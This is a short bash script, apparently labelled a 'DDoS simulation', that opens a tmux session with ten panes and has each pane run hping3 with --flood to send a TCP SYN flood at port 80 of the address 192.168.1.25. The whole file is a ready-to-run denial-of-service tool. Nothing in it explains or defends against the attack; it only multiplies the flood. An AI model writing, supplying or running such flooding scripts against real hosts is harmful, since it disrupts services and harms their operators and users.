#!/bin/bash

# Session Name
SESSION_NAME="ddos_simulation"

# 1. Create a new tmux session in the background
tmux new-session -d -s $SESSION_NAME

# 2. Create 9 additional divisions to make a total of 10 parts
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
    sleep 0.2  # Slight delay to ensure stable screen distribution
done

# 3. Sending the attack command to each pane
# Note: Make sure to run the script with sudo for hping3 to work directly.
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 -S -p 80 --flood -d 200 192.168.1.25" C-m
done

# 4. Enter the session directly
tmux attach-session -t $SESSION_NAME
